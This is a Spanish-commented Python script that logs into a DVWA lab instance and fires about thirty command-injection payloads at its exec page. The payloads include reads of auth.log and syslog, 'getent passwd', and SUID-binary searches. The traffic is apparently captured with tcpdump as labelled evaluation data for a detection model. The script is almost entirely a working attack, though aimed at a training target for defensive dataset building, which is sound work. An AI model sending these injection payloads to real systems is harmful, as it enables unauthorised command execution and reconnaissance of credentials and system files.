import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS COMMAND INJECTION EVALUACION
# DISTINTOS a los de entrenamiento_exec.py
# =============================================

PAYLOADS_EXEC_EVALUACION = [
    "127.0.0.1; cat /proc/cpuinfo",
    "127.0.0.1; cat /proc/meminfo",
    "127.0.0.1; cat /proc/net/dev",
    "127.0.0.1; cat /proc/mounts",
    "127.0.0.1; lsb_release -a",
    "127.0.0.1; dpkg -l",
    "127.0.0.1; apt list --installed",
    "127.0.0.1; ls /home",
    "127.0.0.1; ls /root",
    "127.0.0.1; ls /var/www",
    "127.0.0.1; ls /var/log",
    "127.0.0.1; cat /var/log/syslog",
    "127.0.0.1; cat /var/log/auth.log",
    "127.0.0.1; find / -perm -4000 2>/dev/null",
    "127.0.0.1; find / -name '*.py' 2>/dev/null",
    "127.0.0.1; find / -name '*.sh' 2>/dev/null",
    "127.0.0.1; ss -tlnp",
    "127.0.0.1; ip addr",
    "127.0.0.1; ip route",
    "127.0.0.1; iptables -L",
    "127.0.0.1; systemctl list-units",
    "127.0.0.1; service --status-all",
    "127.0.0.1; who",
    "127.0.0.1; users",
    "127.0.0.1; groups",
    "127.0.0.1; id root",
    "127.0.0.1; getent passwd",
    "127.0.0.1; getent group",
    "127.0.0.1; echo $PATH",
    "127.0.0.1; echo $HOME",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_exec_eval(session):
    print("\n[*] Iniciando ataques Command Injection (evaluacion)...")
    payloads = PAYLOADS_EXEC_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_EVAL | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: COMMAND INJECTION")
    print("  Target: " + BASE_URL)
    print("  Etiqueta real: 'exec'")
    print("")
    print("  !! IMPORTANTE !!")
    print("  NO subir el pcap a Elasticsearch.")
    print("  Guardarlo como: evaluacion_exec.pcap")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_exec_eval(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump y guarda el pcap como:")
    print("  evaluacion_exec.pcap")
    print("="*60)
